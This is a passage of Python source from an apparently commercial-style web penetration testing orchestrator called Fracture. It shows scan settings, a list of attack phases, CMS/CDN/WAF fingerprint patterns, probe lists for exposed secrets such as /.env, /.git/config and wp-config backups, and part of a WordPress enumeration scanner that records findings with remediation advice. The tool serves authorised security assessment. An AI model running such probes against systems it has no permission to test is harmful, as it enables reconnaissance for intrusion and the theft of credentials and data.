                ),
                output=f"From: {r.url}\nTo:   {abs_loc}\nStatus: {r.status_code}",
                sources="fracture-redirect",
                service=target["scheme"],
                affected=r.url,
                output_file=_redir_files,
                owasp="A04:2025 Insecure Design",
                nist="SC-7",
                remediation=(
                    "Verify that this external redirect is intentional. "
                    "Unvalidated redirects can be abused for phishing and open-redirect attacks."
                ),
                http_code=r.status_code,
            )
            vc.log(f"[redirect] Out-of-scope {r.status_code}: {r.url} → {abs_loc}", "INFO")
    sess.hooks["response"].append(_hook)


# ─────────────────────────────────────────────
# Default settings
# ─────────────────────────────────────────────
DEFAULT_SETTINGS: dict = {
    "engagement": {
        "consultant":       "",
        "client_name":      "",
        "client_short":     "",
        "consultant_email": "",
        "start_date":       "",
        "end_date":         "",
    },
    "scan": {
        "project":          "",
        "target_url":       "",
        "target_urls":      [],
        "wordlist":         "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",
        "threads":          _SCAN_CONCURRENCY,
        "timeout":          10,
        "follow_redirects": True,
        "user_agent":       "Mozilla/5.0 (compatible; Fracture/1.0; Security Assessment)",
        "extra_headers":    {},
        "proxy":            "",
        "verify_ssl":       False,
        "phases": {
            "recon": True, "screenshot": True, "webfiles": True,
            "tls": True, "subdomain_takeover": True, "headers": True, "shcheck": True,
            "ffuf": True, "crawl": True, "jwt": True,
            "injection": True, "traversal": True, "business_logic": True, "ssrf": True,
            "auth_bypass": True, "files": True, "vulnscan": True,
            "graphql": False, "logging_monitoring": True, "account_lockout": True,
            "auth_recon": False, "authorization": False,
            "session": False, "csrf": False, "cross_user": False,
            "open_redirect": True, "deserialization": True,
            "file_upload_info": True, "mass_assignment": True,
            "access_matrix":   False,  # Phase 20: multi-credential access matrix
            "bfla":            True,   # Phase 21: broken function level authorization
        },
        "auth": {
            "enabled":                 False,
            "method":                  "form_login",   # auto|form_login|basic|digest|ntlm|ntlm_v2|bearer|session_cookie|token_login|oauth2_client_creds|oauth1a|saml_assertion|oidc_token|mtls|totp_mfa|webauthn_probe|apikey_header|apikey_cookie|header_creds|kerberos|kerberos_delegation
            "auth_type":               "",             # legacy alias for method
            "username":                "",
            "password":                "",
            "domain":                  "",             # NTLM/NTLMv2 domain
            "auth_token":              "",             # bearer / token
            "token_type":              "Bearer",
            "session_cookie":          "",             # pre-captured cookie string
            # Login endpoint (form_login / token_login / totp_mfa)
            "login_url":               "",
            "login_data":              "",             # raw JSON body override (login_mode=json)
            "login_mode":              "fields",       # fields|json|merge
            "login_content_type":      "application/x-www-form-urlencoded",
            "login_username_field":    "username",
            "login_password_field":    "password",
            "login_token_path":        "token",        # dot-path into JSON response (token_login)
            # OAuth2 Client Credentials
            "oauth_token_url":         "",
            "oauth_client_id":         "",
            "oauth_client_secret":     "",
            "oauth_scope":             "",
            "client_auth_method":      "body",         # body|basic (RFC 6749 §2.3.1)
            # OAuth 1.0a
            "oauth1_consumer_key":     "",
            "oauth1_consumer_secret":  "",
            "oauth1_access_token":     "",
            "oauth1_token_secret":     "",
            # SAML 2.0
            "saml_acs_url":            "",
            "saml_assertion":          "",             # base64-encoded SAMLResponse
            "saml_relay_state":        "",
            # OIDC
            "oidc_id_token":           "",
            # mTLS
            "mtls_cert":               "",             # path to PEM certificate
            "mtls_key":                "",             # path to PEM private key
            "mtls_ca_bundle":          "",             # optional CA bundle path
            # TOTP/HOTP MFA
            "totp_mfa_url":            "",             # second-factor POST endpoint
            "totp_secret":             "",             # base32 TOTP secret
            "totp_field":              "otp",
            # API Key
            "api_key":                 "",
            "api_key_header":          "X-API-Key",   # apikey_header method
            "api_key_cookie":          "api_key",     # apikey_cookie method
            # Custom headers
            "custom_headers":          {},             # header_creds method
            # Kerberos
            "kerberos_impersonate":    "",             # S4U2Proxy principal
            # WebAuthn
            "webauthn_probe_url":      "",
        },
        "auth2": {
            "enabled":                 False,
            "method":                  "form_login",
            "auth_type":               "",
            "username":                "",
            "password":                "",
            "domain":                  "",
            "auth_token":              "",
            "token_type":              "Bearer",
            "session_cookie":          "",
            "login_url":               "",
            "login_data":              "",
            "login_mode":              "fields",
            "login_content_type":      "application/x-www-form-urlencoded",
            "login_username_field":    "username",
            "login_password_field":    "password",
            "login_token_path":        "token",
            "api_key":                 "",
            "api_key_header":          "X-API-Key",
            "api_key_cookie":          "api_key",
            "custom_headers":          {},
        },
        "auth_matrix": [],   # list of {role, username, password} for access matrix
        "sqlmap_timeout":   300,
        "nuclei_timeout":   600,
        "crawl_depth":      10,
        "crawl_max_pages":  500,
        "gobuster_wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt",
        "ffuf_vhost_wordlist": "/usr/share/seclists/Discovery/DNS/namelist.txt",
        "ffuf_param_wordlist": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
        "wpscan_token":     "",
    },
}


def _load_settings(path: str) -> dict:
    import copy
    settings = copy.deepcopy(DEFAULT_SETTINGS)
    if path:
        try:
            with open(path, encoding="utf-8") as f:
                user = json.load(f)
            # deep merge scan section
            for k, v in user.get("engagement", {}).items():
                settings["engagement"][k] = v
            for k, v in user.get("scan", {}).items():
                if isinstance(v, dict) and isinstance(settings["scan"].get(k), dict):
                    settings["scan"][k].update(v)
                else:
                    settings["scan"][k] = v
        except Exception as e:
            vc.log(f"Could not load settings from {path}: {e}", "WARNING")
    return settings


# ─────────────────────────────────────────────
# Argument parsing
# ─────────────────────────────────────────────
PHASE_LIST = [
    ("recon",         "Phase 0:  HTTP probe, fingerprinting, directory discovery"),
    ("tls",           "Phase 1:  TLS/SSL cipher and certificate analysis"),
    ("subdomain_takeover", "Phase 1b: Subdomain takeover — dangling CNAME, AXFR zone transfer"),
    ("headers",       "Phase 2:  Security header inspection"),
    ("crawl",         "Phase 3:  Crawl, form extraction, JS secret hunting"),
    ("injection",     "Phase 4:  SQLi, XSS, SSTI, CMDi, CRLF, XXE"),
    ("traversal",     "Phase 5:  Path traversal / LFI"),
    ("business_logic", "Phase 5b: Business logic — workflow, race conditions, TOCTOU, value tampering"),
    ("ssrf",          "Phase 6:  Server-Side Request Forgery"),
    ("auth_bypass",   "Phase 7:  Authentication bypass / default creds"),
    ("files",         "Phase 8:  Sensitive file exposure"),
    ("vulnscan",      "Phase 9:  Nuclei + Nikto vulnerability scan"),
    ("graphql",       "Phase 10: GraphQL endpoint detection and introspection"),
    ("logging_monitoring", "Phase 10b: Security logging/monitoring failures — actuator exposure, verbose errors"),
    ("account_lockout",   "Phase 7b: Account lockout and brute-force protection testing"),
    ("auth_recon",    "Phase 11: Authenticated endpoint enumeration (requires auth)"),
    ("authorization", "Phase 12: IDOR / privilege escalation testing (requires auth)"),
    ("session",       "Phase 13: Session management analysis (requires auth)"),
    ("csrf",          "Phase 14: CSRF protection testing (requires auth)"),
    ("cross_user",      "Phase 15: Cross-user data leakage (requires auth + auth2)"),
    ("open_redirect",   "Phase 16: Open redirect testing"),
    ("deserialization", "Phase 17: Insecure deserialization detection"),
    ("file_upload_info","Phase 18: File upload endpoint detection (informational)"),
    ("mass_assignment", "Phase 19: Mass assignment / privilege escalation testing"),
    ("access_matrix",  "Phase 20: Multi-credential access matrix (BFLA / unauthenticated access)"),
    ("bfla",           "Phase 21: Broken Function Level Authorization — cross-role endpoint replay"),
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="fracture.py",
        description="Fracture — Web Application Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--settings",      metavar="FILE", help="Path to JSON settings file")
    parser.add_argument("--url",           metavar="URL",  help="Target URL (inline mode)")
    parser.add_argument("--project",       metavar="DIR",  help="Output directory", default="")
    parser.add_argument("--fast",          action="store_true", help="Skip slow phases (vulnscan, sqlmap)")
    parser.add_argument("--resume",        action="store_true", help="Resume from checkpoint")
    parser.add_argument("--no-injection",  action="store_true", help="Skip injection phase")
    parser.add_argument("--no-vulnscan",   action="store_true", help="Skip nuclei vulnscan")
    parser.add_argument("--no-ffuf",       action="store_true", help="Skip ffuf vhost and parameter fuzzing")
    parser.add_argument("--no-auth",       action="store_true", help="Skip all authenticated phases")
    parser.add_argument("--browser-auth",  action="store_true", help="Fall back to interactive browser login if automated auth fails")
    parser.add_argument("--chromedriver",  metavar="PATH", help="Path to chromedriver binary (used with --browser-auth)")
    parser.add_argument("--list-phases",   action="store_true", help="Print phases and exit")
    parser.add_argument("--username",      metavar="USER", help="Auth username")
    parser.add_argument("--password",      metavar="PASS", help="Auth password")
    parser.add_argument("--auth-type",     metavar="TYPE", default="form", help="Auth type: form/basic/token")
    parser.add_argument("--login-url",     metavar="URL",  help="Login endpoint URL")
    parser.add_argument("--auth-token",    metavar="TOKEN", help="Bearer/API token")
    parser.add_argument("--threads",       type=int, default=None, help="Number of threads")
    parser.add_argument("--timeout",       type=int, default=None, help="Request timeout in seconds")
    return parser.parse_args()


# =============================================================================
# PHASE IMPLEMENTATIONS
# =============================================================================

# ─────────────────────────────────────────────
# Phase 0: Recon
# ─────────────────────────────────────────────
_CMS_PATTERNS = {
    "WordPress":   [re.compile(r'wp-content|wp-includes|wordpress', re.I)],
    "Drupal":      [re.compile(r'Drupal|drupal\.js|sites/default', re.I)],
    "Joomla":      [re.compile(r'Joomla|/components/com_', re.I)],
    "Magento":     [re.compile(r'mage/|Magento|/skin/frontend/|/pub/static/frontend/', re.I)],
    "Shopify":     [re.compile(r'cdn\.shopify\.com|shopify\.com/s/files|Shopify\.theme', re.I)],
    "TYPO3":       [re.compile(r'typo3|TYPO3 CMS', re.I)],
    "Ghost":       [re.compile(r'content/themes/casper|ghost\.io|ghostcms|\/ghost\/api\/', re.I)],
    "WooCommerce": [re.compile(r'woocommerce|/wc-api/|wc-ajax=', re.I)],
    "PrestaShop":  [re.compile(r'prestashop|\/index\.php\?controller=', re.I)],
    "OpenCart":    [re.compile(r'opencart|route=common/home', re.I)],
    "DotNetNuke":  [re.compile(r'dotnetnuke|dnnVariable|DNN', re.I)],
    "Umbraco":     [re.compile(r'umbraco|__umbracoRedirectId', re.I)],
    "Django":      [re.compile(r'csrfmiddlewaretoken|django', re.I)],
    "Laravel":     [re.compile(r'laravel_session|Laravel', re.I)],
    "Rails":       [re.compile(r'_rails_|authenticity_token', re.I)],
    "Express":     [re.compile(r'X-Powered-By.*Express', re.I)],
}
_CDN_SERVER_RE = re.compile(
    r'\b(cloudflare|akamai(?:ghost)?|fastly|cloudfront|varnish|'
    r'bunny|bunnycdn|keycdn|stackpath|maxcdn|netlify|vercel)\b',
    re.I,
)
_CDN_HDR_PATTERNS = [
    # header name (case-insensitive match)  → CDN name
    ("CF-RAY",              "Cloudflare"),
    ("x-vercel-id",         "Vercel"),
    ("x-nf-request-id",     "Netlify"),
    ("x-amz-cf-id",         "Amazon CloudFront"),
    ("x-amz-cf-pop",        "Amazon CloudFront"),
    ("CDN-PullZone",        "BunnyCDN"),
    ("x-akamai-request-id", "Akamai"),
    ("x-akamai-session-info", "Akamai"),
    ("akamai-global-host",  "Akamai"),
    ("x-check-cacheable",   "Akamai"),
    ("x-azure-ref",         "Azure CDN"),
    ("x-cdn",               "StackPath"),
    ("fastly-io-info",      "Fastly"),
]
# Edge security platform detection — response headers that indicate a WAF,
# bot-protection service, or cloud-native security layer is in front of the target.
# Each entry: (header_name_lowercase, platform_name).  Prefix matches (e.g. "x-px-")
# are handled by the _detect_edge_security function.
_EDGE_SECURITY_HDR_PATTERNS = [
    # Sucuri WAF
    ("x-sucuri-id",                   "Sucuri WAF"),
    ("x-sucuri-cache",                "Sucuri WAF"),
    # Imperva / Incapsula
    ("x-iinfo",                       "Imperva"),
    ("x-cdn-request-id",              "Imperva"),
    ("x-imperva-sid",                 "Imperva"),
    # Fastly Next-Gen WAF (formerly Signal Sciences)
    ("x-fw-hash",                     "Fastly WAF"),
    ("x-fw-protection-mode",          "Fastly WAF"),
    ("x-fw-type",                     "Fastly WAF"),
    # F5 / Shape Security
    ("x-f5-cs-sensor-data",           "F5 Shape Security"),
    ("x-f5-riak-bucket",              "F5 BIG-IP"),
    # Barracuda WAF
    ("barra-counter-session",         "Barracuda WAF"),
    # Fortinet FortiWeb
    ("x-waf-event-info",              "Fortinet FortiWeb"),
    # AWS WAF / Shield
    ("x-amzn-waf-action",             "AWS WAF"),
    # Azure Front Door WAF
    ("x-azure-fdid",                  "Azure Front Door"),
    # Radware (formerly Distil Networks)
    ("x-distil-cs",                   "Radware Bot Manager"),
    # Reblaze
    ("rbzid",                         "Reblaze"),
    # ModSecurity (generic)
    ("x-modsecurity-id",              "ModSecurity"),
]
# Prefix-based edge security header patterns (header name starts with prefix)
_EDGE_SECURITY_HDR_PREFIXES = [
    ("x-px-",         "PerimeterX / HUMAN Security"),
    ("x-perimeterx-", "PerimeterX / HUMAN Security"),
    ("x-datadome-",   "DataDome"),
    ("x-kasada-",     "Kasada"),
    ("x-arkose-",     "Arkose Labs"),
]
# Body signatures for edge security platforms (challenge / block pages)
_EDGE_SECURITY_BODY_PATTERNS = [
    (re.compile(r'_pxParam|__pxChallenge|pxCaptcha|PerimeterX', re.I), "PerimeterX / HUMAN Security"),
    (re.compile(r'datadome\.co/captcha|dd-device-check', re.I),         "DataDome"),
    (re.compile(r'kasada\.io|kasada-client', re.I),                      "Kasada"),
    (re.compile(r'Sucuri WebSite Firewall|sucuri\.net', re.I),           "Sucuri WAF"),
    (re.compile(r'incapsula|CloudGuard', re.I),                          "Imperva"),
    (re.compile(r'arkose\.com|arkoselabs\.com', re.I),                   "Arkose Labs"),
    (re.compile(r'reblaze\.com', re.I),                                  "Reblaze"),
]
_BI_PATTERNS = {
    "Grafana":         [re.compile(r'grafana|/grafana/|GrafanaApp', re.I)],
    "Kibana":          [re.compile(r'kbn-name.*kibana|kbn-version|/app/kibana', re.I)],
    "Tableau":         [re.compile(r'tableau|vizql\.js|/vizportal/', re.I)],
    "Metabase":        [re.compile(r'metabase|MetabaseBootstrap', re.I)],
    "Apache Superset": [re.compile(r'apache-superset|superset-all\.js', re.I)],
    "Redash":          [re.compile(r'redash\.min\.js|\/api\/queries\b', re.I)],
    "Splunk":          [re.compile(r'splunk|SplunkWebUI', re.I)],
    "Zabbix":          [re.compile(r'zabbix\.php|zabbix\.min\.js|Zabbix SIA', re.I)],
    "Nagios":          [re.compile(r'nagios|nagiosxi', re.I)],
    "Prometheus":      [re.compile(r'# HELP \w+_\w+ |/api/v1/targets', re.I)],
    "Power BI":        [re.compile(r'powerbi-client|PowerBI\.embed', re.I)],
    "Looker":          [re.compile(r'\blooker\b|LookerBrowser|/looker/', re.I)],
    "IBM Cognos":      [re.compile(r'ibmcognos|cam_passport|/bi/v1/|xts\.run|IBM\s+Cognos|cognos\.js', re.I)],
}
# Paths that require authentication on each BI platform — HTTP 200 without
# credentials indicates unauthenticated access.  Paths known to be public
# (e.g. /api/health) are intentionally excluded.
_BI_UNAUTH_PROBES = {
    "Grafana":         [("/api/org",    "organisation API"),
                        ("/api/search", "dashboard search API")],
    "Metabase":        [("/api/database", "database configuration API")],
    "Apache Superset": [("/api/v1/dashboard/", "dashboard list API")],
    "Prometheus":      [("/metrics",         "metrics endpoint"),
                        ("/api/v1/targets",  "targets API")],
    "Redash":          [("/api/dashboards",  "dashboards API")],
    "Splunk":          [("/services/server/info?output_mode=json", "server info API")],
    "Zabbix":          [("/api_jsonrpc.php", "JSON-RPC API")],
    # IBM Cognos — paths are relative to the Cognos base URL (e.g. /ibmcognos/)
    # bi/admin/ requires Cognos admin role; api/v1/namespaces requires auth in v11+;
    # cgi-bin/cognos.cgi is the legacy SOAP dispatcher (present on v10/v11 installs).
    "IBM Cognos":      [("/bi/admin/",                          "administration console"),
                        ("/api/v1/namespaces",                  "REST API namespace list (v11+)"),
                        ("/cgi-bin/cognos.cgi",                 "legacy SOAP dispatcher"),
                        ("/bi/v1/disp?b_action=xts.run&m=portal/main.xts", "portal (unauthenticated access)")],
}
_SERVER_PATTERNS = {
    "Apache": re.compile(r'Apache', re.I),
    "Nginx":  re.compile(r'nginx', re.I),
    "IIS":    re.compile(r'Microsoft-IIS', re.I),
    "Tomcat": re.compile(r'Apache Tomcat|Tomcat', re.I),
}
_LANG_PATTERNS = {
    "PHP":    re.compile(r'\.php|X-Powered-By.*PHP|PHPSESSID', re.I),
    "ASP.NET": re.compile(r'ASP\.NET|__VIEWSTATE|\.aspx', re.I),
    "Ruby":   re.compile(r'Ruby|_session_id', re.I),
    "Python": re.compile(r'Python|Django|Flask|Werkzeug', re.I),
    "Java":   re.compile(r'JSESSIONID|\.jsp|Servlet', re.I),
}
_ADMIN_PATHS = [
    "/admin", "/administrator", "/wp-admin", "/phpmyadmin", "/manager",
    "/dashboard", "/portal", "/cpanel", "/webadmin", "/admin.php",
    "/admincp", "/admin/login", "/admin/dashboard", "/backend",
]
_COMMON_PATHS = [
    "/.well-known/security.txt", "/.well-known/openid-configuration",
    "/api/", "/v1/", "/v2/", "/swagger", "/swagger-ui.html",
    "/api/swagger.json", "/openapi.json", "/.git/HEAD", "/.env", "/robots.txt",
]
_TOP_200_PATHS = [
    "/index.php", "/index.html", "/login", "/login.php", "/register", "/logout",
    "/profile", "/user", "/users", "/account", "/api", "/api/v1", "/api/v2",
    "/admin", "/administrator", "/config", "/settings", "/setup", "/install",
    "/backup", "/test", "/dev", "/debug", "/info", "/search", "/upload",
    "/uploads", "/files", "/images", "/static", "/assets",
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/.env",
    "/wp-content", "/wp-includes", "/wp-login.php", "/wp-admin",
    "/phpmyadmin", "/pma", "/db", "/database", "/server-status", "/server-info",
    "/status", "/health", "/metrics", "/actuator", "/actuator/health",
    "/phpinfo.php", "/info.php", "/test.php", "/old", "/bak",
    "/.git/HEAD", "/.git/config", "/.svn", "/.DS_Store",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/composer.json", "/package.json", "/requirements.txt",
    "/web.config", "/.htpasswd", "/console", "/shell", "/private", "/internal",
]

# ─────────────────────────────────────────────────────────────────────────────
# WordPress native scanner — constants
# ─────────────────────────────────────────────────────────────────────────────
_WP_CONFIG_BACKUPS = [
    "wp-config.bak", "wp-config.php.bak", "wp-config.php~",
    "wp-config.php.old", "wp-config.php.orig", "wp-config.php.save",
    "wp-config.php.swp", ".wp-config.php.swp", "wp-config.php.txt",
    "wp-config-sample.php",
]

_WP_DB_BACKUP_PATHS = [
    "/backup.sql", "/backup.sql.gz", "/backup.zip",
    "/database.sql", "/db.sql", "/mysql.sql", "/dump.sql",
    "/wordpress.sql", "/wp.sql",
    "/wp-content/backup-db/backup.sql", "/wp-content/backups/backup.sql",
    "/wp-content/uploads/backup.sql", "/wp-content/uploads/database.sql",
    "/export.xml", "/wp-export.xml",
]

_WP_PLUGIN_SLUGS = [
    "akismet", "all-in-one-seo-pack", "all-in-one-wp-migration",
    "all-in-one-wp-security-and-firewall", "bbpress", "better-wp-security",
    "bookingpress-appointment-booking", "buddypress", "classic-editor",
    "contact-form-7", "cookie-notice", "depicter", "download-manager",
    "drag-and-drop-multiple-file-upload-contact-form-7", "duplicator",
    "easy-wp-smtp", "elementor", "elementor-pro",
    "essential-addons-for-elementor-lite", "file-manager-advanced-shortcode",
    "formidable", "give", "gravityforms", "jetpack", "learnpress",
    "loginizer", "mailchimp-for-wp", "memberpress",
    "modern-events-calendar-lite", "nextgen-gallery", "ninja-forms",
    "paid-memberships-pro", "photo-gallery", "pie-register", "popup-maker",
    "post-smtp", "really-simple-ssl", "redirection", "royal-elementor-addons",
    "seo-by-rank-math", "shortpixel-image-optimiser", "simple-file-list",
    "slider-revolution", "suretriggers", "tatsu", "the-events-calendar",
    "ultimate-member", "updraftplus", "user-registration", "w3-total-cache",
    "woocommerce", "woocommerce-payments", "wordfence", "wordpress-importer",
    "wordpress-popular-posts", "wpforms-lite", "wpdiscuz", "wp-automatic",
    "wp-fastest-cache", "wp-file-manager", "wp-gdpr-compliance",
    "wp-mail-smtp", "wp-optimize", "wp-statistics", "wp-super-cache",
    "wp-time-capsule", "wptouch", "wp-ultimate-csv-importer",
    "wp-user-avatar", "wysija-newsletters", "yoast-seo",
    "ajax-load-more", "backup-backup", "boldgrid-backup",
    "catch-themes-demo-import", "email-subscribers", "front-end-editor",
    "inboundio-marketing", "masterstudy-lms-learning-management-system",
    "perfect-survey", "plainview-activity-monitor", "reflex-gallery",
    "secure-copy-content-protection", "sexy-contact-form",
    "slideshow-gallery", "sp-client-document-manager",
    "subscribe-to-comments", "website-contact-form-with-file-upload",
    "woocommerce-abandoned-cart", "work-the-flow-file-upload",
    "wp-easycart", "wp-mobile-detector", "wpshop", "wp-symposium",
    "bulletproof-security", "chopslider", "hash-form", "gi-media-library",
    "smtp-mailer", "social-login-bws", "yet-another-related-posts-plugin",
    "duplicator-pro", "envato-elements", "mc4wp-mailchimp-for-wp",
    "blocksy-companion", "kadence-blocks", "generateblocks",
    "beaver-builder-lite-version",
]

_WP_THEME_SLUGS = [
    "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
    "twentytwentyone", "twentytwenty", "twentynineteen",
    "twentyseventeen", "twentysixteen", "twentyfifteen",
    "astra", "avada", "blocksy", "bricks", "bridge", "divi",
    "enfold", "flatsome", "generatepress", "hello-elementor",
    "kadence", "neve", "oceanwp", "porto", "salient",
    "storefront", "the7", "woodmart", "xstore", "zakra",
    "sydney", "hestia", "betheme", "jupiter", "uncode",
    "newspaper", "total", "zephyr-lite",
]


def _phase_wordpress_scan(
    url: str, target: dict, cfg: dict,
    out: "OutputManager", sess: "requests.Session",
    phase: str = "recon",
    homepage_html: str = "",
) -> dict:
    """Native WordPress enumeration: version, users, plugins, themes, XML-RPC,
    REST API, config/file exposure, directory listings, and backup detection.
    Runs whenever WordPress is detected — no external tool required."""
    base       = url.rstrip("/")
    wp_timeout = min(cfg.get("timeout", 10), 8)
    hostname   = target["hostname"]
    wp_info: dict = {
        "version": None, "version_source": None,
        "users": [], "plugins": [], "themes": [],
        "xmlrpc": False, "rest_api": False, "multisite": False,
        "login_accessible": False, "debug_log": False,
        "config_backups": [],
    }
    xmlrpc_methods: list = []
    _wp_discovered_urls: list = []   # (full_url, status_code, redirect_dest | None)

    def _wp_get(path, **kw):
        try:
            _allow_redir = kw.pop("allow_redirects", True)
            r = sess.get(base + path, timeout=wp_timeout,
                         allow_redirects=_allow_redir, **kw)
            if r is None:
                return r
            if 200 <= r.status_code < 300:
                _wp_discovered_urls.append((base + path, r.status_code, None))
            elif 300 <= r.status_code < 400:
                # allow_redirects=False call: r is the raw redirect response
                _wp_discovered_urls.append(
                    (base + path, r.status_code,
                     r.headers.get("Location") or None))
            elif _allow_redir and r.history:
                # allow_redirects=True call: history[0] is the original redirect
                _first = r.history[0]
                if 300 <= _first.status_code < 400:
                    _wp_discovered_urls.append(
                        (base + path, _first.status_code,
                         _first.headers.get("Location") or None))
            return r
        except Exception:
            return None

    vc.log("[wordpress] Starting native WordPress scan", "INFO")

    # ── 1. VERSION DETECTION ─────────────────────────────────────────────────
    ver_candidates: list = []  # (version, confidence_pct, source_label)

    if homepage_html:
        m = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress\s+([\d.]+)',
            homepage_html, re.I,
        )
        if not m:
            m = re.search(
                r'content=["\']WordPress\s+([\d.]+)["\'][^>]+name=["\']generator["\']',
                homepage_html, re.I,
            )
        if m:
            ver_candidates.append((m.group(1), 100, "meta-generator"))
        xgen_m = re.search(r'X-Generator:\s*WordPress/([\d.]+)', homepage_html, re.I)
        if xgen_m:
            ver_candidates.append((xgen_m.group(1), 95, "X-Generator-header"))

    _feed_checks = [
        ("/?feed=rss2",
         r'<generator>https?://wordpress\.(?:org|com)/\?v=([\d.]+)</generator>',
         "rss2-feed"),
        ("/feed/",
         r'<generator>https?://wordpress\.(?:org|com)/\?v=([\d.]+)</generator>',
         "rss-feed"),
        ("/?feed=atom",
         r'<generator[^>]+version=["\']?([\d.]+)["\']?>WordPress',
         "atom-feed"),
        ("/wp-links-opml.php",
         r'generator=["\']wordpress/([\d.]+)["\']',
         "opml"),
        ("/?feed=rdf",
         r'rdf:resource=["\']https?://wordpress\.org/\?v=([\d.]+)["\']',
         "rdf-feed"),
    ]
    for _fp, _fp_re, _fp_src in _feed_checks:
        if any(c[2].endswith("feed") for c in ver_candidates):
            break
        r = _wp_get(_fp)
        if r and r.status_code == 200:
            m = re.search(_fp_re, r.text, re.I)
            if m:
                ver_candidates.append((m.group(1), 90, _fp_src))

    r = _wp_get("/readme.html")
    if r and r.status_code == 200 and "wordpress" in r.text.lower():
        m = re.search(r'[Vv]ersion\s+([\d.]+)', r.text)
        if m:
            ver_candidates.append((m.group(1), 70, "readme.html"))
        _rq, _rp = _save_http_evidence(out, phase, f"wp_readme_{hostname}", r)
        out.add_finding(
            title="WordPress readme.html Accessible",
            url=base + "/readme.html", port=target["port"], risk="LOW",
            description=(
                "The WordPress readme.html file is publicly accessible. "
                "It discloses version information and confirms the CMS. "
                "This file serves no purpose in production."
            ),
            output=f"GET /readme.html → HTTP {r.status_code}",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=f"{_rq},{_rp}",
            owasp="A06:2025 Vulnerable and Outdated Components", nist="CM-7",
            remediation="Delete /readme.html from your WordPress installation.",
            http_code=r.status_code,
        )

    r = _wp_get("/license.txt")
    if r and r.status_code == 200 and "wordpress" in r.text.lower():
        try:
            _lx_rq, _lx_rp = _save_http_evidence(out, phase, f"wp_license_{hostname}", r)
            _lx_ev = f"{_lx_rq},{_lx_rp}"
        except Exception:
            _lx_ev = ""
        out.add_finding(
            title="WordPress license.txt Accessible",
            url=base + "/license.txt", port=target["port"], risk="INFO",
            description="The WordPress license.txt file is publicly accessible.",
            output=f"GET /license.txt → HTTP {r.status_code}",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=_lx_ev,
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="Remove /license.txt from production to reduce fingerprinting.",
            http_code=r.status_code,
        )

    if ver_candidates:
        ver_candidates.sort(key=lambda x: x[1], reverse=True)
        best_ver, best_conf, best_src = ver_candidates[0]
        wp_info["version"]        = best_ver
        wp_info["version_source"] = best_src
        _ver_ev = out.output_path(phase, f"wp_version_{hostname}")
        _ver_ev.write_text(
            "\n".join(f"{v}  confidence:{c}%  source:{s}"
                      for v, c, s in ver_candidates),
            encoding="utf-8",
        )
        out.add_finding(
            title=f"WordPress Version Detected: {best_ver}",
            url=base, port=target["port"], risk="LOW",
            description=(
                f"WordPress version {best_ver} was identified via {best_src} "
                f"(confidence {best_conf}%). Advertising the exact CMS version "
                "leaks information that assists attackers in targeting known vulnerabilities."
            ),
            output="\n".join(f"{v}  ({s})" for v, _, s in ver_candidates),
            sources="fracture-wordpress", service=target["scheme"],
            output_file=str(_ver_ev),
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation=(
                "Remove version indicators: delete readme.html and license.txt; "
                "suppress the generator meta tag with "
                "remove_action('wp_head','wp_generator') in functions.php; "
                "keep WordPress updated to the latest release."
            ),
        )
        vc.log(f"[wordpress] Version: {best_ver} via {best_src}", "SUCCESS")

    # ── 2. LOGIN PAGE ANALYSIS ───────────────────────────────────────────────
    r = _wp_get("/wp-login.php")
    if r and r.status_code == 200 and "user_login" in r.text:
        wp_info["login_accessible"] = True
        _lrq, _lrp = _save_http_evidence(out, phase, f"wp_login_{hostname}", r)
        out.add_finding(
            title="WordPress Login Page Accessible",
            url=base + "/wp-login.php", port=target["port"], risk="MEDIUM",
            description=(
                "The WordPress login page is publicly accessible, exposing the "
                "site to brute-force and credential stuffing attacks. "
                "Its presence also confirms the CMS identity and version family."
            ),
            output=f"GET /wp-login.php → HTTP {r.status_code}",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=f"{_lrq},{_lrp}",
            owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
            remediation=(
                "Rename or restrict the login URL (e.g., WPS Hide Login plugin). "
                "Enforce rate limiting, CAPTCHA, account lockout, and two-factor "
                "authentication on the login endpoint."
            ),
            http_code=r.status_code,
        )
        r_reg = _wp_get("/wp-login.php?action=register")
        if r_reg and r_reg.status_code == 200 and "user_email" in r_reg.text.lower():
            _rrq, _rrp = _save_http_evidence(out, phase, f"wp_register_{hostname}", r_reg)
            out.add_finding(
                title="WordPress User Registration Enabled",
                url=base + "/wp-login.php?action=register",
                port=target["port"], risk="MEDIUM",
                description=(
                    "WordPress user registration is open to anyone. "
                    "If default roles are misconfigured this may allow "
                    "privilege escalation or spam account creation."
                ),
                output=f"GET /wp-login.php?action=register → HTTP {r_reg.status_code}",
                sources="fracture-wordpress", service=target["scheme"],
                output_file=f"{_rrq},{_rrp}",
                owasp="A05:2025 Security Misconfiguration", nist="IA-5",
                remediation=(
                    "Disable open registration in Settings > General unless required. "
                    "Set the default user role to Subscriber and review existing accounts."
                ),
                http_code=r_reg.status_code,
            )
        r_lp = _wp_get("/wp-login.php?action=lostpassword")
        if r_lp and r_lp.status_code == 200 and (
                "user_login" in r_lp.text.lower() or "username" in r_lp.text.lower()):
            _lprq, _lprp = _save_http_evidence(out, phase, f"wp_lostpassword_{hostname}", r_lp)
            out.add_finding(
                title="WordPress Password Reset Form Accessible",
                url=base + "/wp-login.php?action=lostpassword",
                port=target["port"], risk="LOW",
                description=(
                    "The password reset form is publicly accessible. "
                    "Depending on error messages, it may confirm whether a "
                    "given username or e-mail address exists."
                ),
                output=f"GET /wp-login.php?action=lostpassword → HTTP {r_lp.status_code}",
                sources="fracture-wordpress", service=target["scheme"],
                output_file=f"{_lprq},{_lprp}",
                owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                remediation=(
                    "Return generic error messages that do not distinguish between "
